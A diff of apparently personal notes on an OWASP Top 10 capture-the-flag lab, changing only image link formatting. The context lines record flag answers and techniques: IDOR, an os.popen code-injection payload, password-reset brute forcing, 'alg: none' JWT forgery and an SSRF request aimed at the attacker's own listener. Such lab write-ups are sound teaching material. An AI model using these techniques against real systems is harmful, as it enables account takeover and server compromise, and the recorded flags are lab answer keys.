@@ -24,11 +24,11 @@ tags:
 
 Look at other users' notes. What is the flag?
 
-![](Pasted%20image%2020240923154336.png)
+![](Pasted image 20240923154336.png)
 
 - change `note_id` in the URL to 0 and the flags appears
 
-![](Pasted%20image%2020240923154449.png)
+![](Pasted image 20240923154449.png)
 
 
 	`A: flag{fivefourthree}`
@@ -70,21 +70,21 @@ Look at other users' notes. What is the flag?
 
 What is the name of the mentioned directory?
 
-![](Pasted%20image%2020240923171751.png)
+![](Pasted image 20240923171751.png)
 
 	`A: /assets`
 
 Navigate to the directory you found in question one. What file stands out as being likely to contain sensitive data?  
 
-![](Pasted%20image%2020240923172004.png) 
+![](Pasted image 20240923172004.png) 
 
 	`A: webapp.db`
 
 Use the supporting material to access the sensitive data. What is the password hash of the admin user?  
 
-![](Pasted%20image%2020240923172339.png)
+![](Pasted image 20240923172339.png)
 
-![](Pasted%20image%2020240923172356.png)
+![](Pasted image 20240923172356.png)
 
 	`A: 6eea9b7ef19179a06954edd0f6c05ceb`
 
@@ -129,7 +129,7 @@ Log in as the admin. What is the flag?
 - An injection web vulnerability allows an attacker to take advantage of that call to execute operating system commands arbitrarily on the server. 
 	- The possibilities for the attacker from here are endless: they could list files, read their contents, run some basic commands to do some recon on the server or whatever they wanted, just as if they were sitting in front of the server and issuing commands directly into the command line.
 
-![](Pasted%20image%2020240923173353.png)
+![](Pasted image 20240923173353.png)
 
 - Bash allows you to run commands within commands. 
 - This is useful for many reasons, but in our case, it will be used to inject a command within the cowsay server to get it executed.
@@ -153,18 +153,18 @@ Log in as the admin. What is the flag?
 
 What strange text file is in the website's root directory?
 
-![](Pasted%20image%2020240923174555.png)
+![](Pasted image 20240923174555.png)
 
 	`A: drpepper.txt`
 
 How many non-root/non-service/non-daemon users are there?  
-![](Pasted%20image%2020240923175202.png)
+![](Pasted image 20240923175202.png)
 
 	`A: 0`
 
 What user is this app running as?  
 
-![](Pasted%20image%2020240923175331.png)
+![](Pasted image 20240923175331.png)
 
 	`A: apache`
 
@@ -176,7 +176,7 @@ What is the user's shell set as?
 
 What version of Alpine Linux is running?
 
-![](Pasted%20image%2020240923175445.png)
+![](Pasted image 20240923175445.png)
 
 	`A: 3.16.0`
 
@@ -209,17 +209,17 @@ What is the value of the flag in joseph's account?
 - Reset Joseph's password by entering the username `joseph` in the reset password menu
 - choose the favourite colour question and simply brute force it
 
-![](Pasted%20image%2020240924101121.png)
+![](Pasted image 20240924101121.png)
 
-![](Pasted%20image%2020240924101001.png)
+![](Pasted image 20240924101001.png)
 
 - then login using the given password and the username `joseph`
 
-![](Pasted%20image%2020240924101209.png)
+![](Pasted image 20240924101209.png)
 
 - naivgate to private and then there is a file with the flag in it
 
-![](Pasted%20image%2020240924101250.png)
+![](Pasted image 20240924101250.png)
 
 	`A: THM{Not_3ven_c4tz_c0uld_sav3_U!}`
 
@@ -252,13 +252,13 @@ What is the database file name (the one with the .db extension) in the current d
 import os; print(os.popen("ls -l").read())
 ```
 
-![](Pasted%20image%2020240925113559.png)
+![](Pasted image 20240925113559.png)
 
 	`A: todo.db`
 
 Modify the code to read the contents of the `app.py` file, which contains the application's source code. What is the value of the `secret_flag` variable in the source code?
 
-![](Pasted%20image%2020240925113715.png)
+![](Pasted image 20240925113715.png)
 
 	`A: THM{Just_a_tiny_misconfiguration}`
 
@@ -287,9 +287,9 @@ Modify the code to read the contents of the `app.py` file, which contains the�
 
 What is the content of the /opt/flag.txt file?
 
-![](Pasted%20image%2020240925120033.png)
+![](Pasted image 20240925120033.png)
 
-![](Pasted%20image%2020240925120343.png)
+![](Pasted image 20240925120343.png)
 
 - the flag is in `/opt/flag.txt`
 
@@ -331,7 +331,7 @@ What is the content of the /opt/flag.txt file?
 What is the flag that you found in darren's account?
 
 - Since the user `darren` already exists, we will register a new account called ` darre`
-![](Pasted%20image%2020240925121247.png)
+![](Pasted image 20240925121247.png)
 
 	`A: fe86079416a21a3c99937fea8874b667`
 
@@ -377,7 +377,7 @@ Now try to do the same trick and see if you can log in as arthur. What is the f
 
 What is the SHA-256 hash of `https://code.jquery.com/jquery-1.12.4.min.js`?
 
-![](Pasted%20image%2020240925131034.png)
+![](Pasted image 20240925131034.png)
 
 	`A: sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=`
 
@@ -434,13 +434,13 @@ What is the SHA-256 hash of `https://code.jquery.com/jquery-1.12.4.min.js`?
 
 Try logging into the application as guest. What is guest's account password?
 
-![](Pasted%20image%2020240926094429.png)
+![](Pasted image 20240926094429.png)
 
 	`A: guest`
 
 What is the name of the website's cookie containing a JWT token?
 
-![](Pasted%20image%2020240926095143.png)
+![](Pasted image 20240926095143.png)
 
 	`A: jwt-session`
 
@@ -448,7 +448,7 @@ What is the flag presented to the admin user?
 
 - First base64 decode the cookie to get the JWT token's data.
 
-![](Pasted%20image%2020240926095430.png)
+![](Pasted image 20240926095430.png)
 
 - Then encode the first two parts *separately* with the changes mentioned above:
 	- change **alg** to **none**
@@ -459,7 +459,7 @@ What is the flag presented to the admin user?
 
 - Paste this in the cookie value column and refresh the page
 
-![](Pasted%20image%2020240926101223.png)
+![](Pasted image 20240926101223.png)
 
 	`A: THM{Dont_take_cookies_from_strangers}`
 
@@ -497,7 +497,7 @@ What is the flag presented to the admin user?
 
 What IP address is the attacker using?
 
-![](Pasted%20image%2020240926101754.png)
+![](Pasted image 20240926101754.png)
 
 	`A: 49.99.13.16`
 
@@ -532,7 +532,7 @@ What kind of attack is being carried out?
 
 - You could then just capture the contents of the request using Netcat:
 
-![](Pasted%20image%2020240926102543.png)
+![](Pasted image 20240926102543.png)
 
 -  SSRF can be used for:  
 	- Enumerate internal networks, including IP addresses and ports.
@@ -544,13 +544,13 @@ What kind of attack is being carried out?
 
 Explore the website. What is the only host allowed to access the admin area?
 
-![](Pasted%20image%2020240926102713.png)
+![](Pasted image 20240926102713.png)
 
 	`A: localhost`
 
 Check the "Download Resume" button. Where does the server parameter point to?
 
-![](Pasted%20image%2020240926102815.png)
+![](Pasted image 20240926102815.png)
 
 	`A: secure-file-storage.com`
 
@@ -560,6 +560,6 @@ Using SSRF, make the application send the request to your AttackBox instead of t
 
 - make a request to `http://10.10.179.223:8087/download?server=<your_ip>:<your_port>&id=75482342`
 
-![](Pasted%20image%2020240926103247.png)
+![](Pasted image 20240926103247.png)
 
 	`A: `
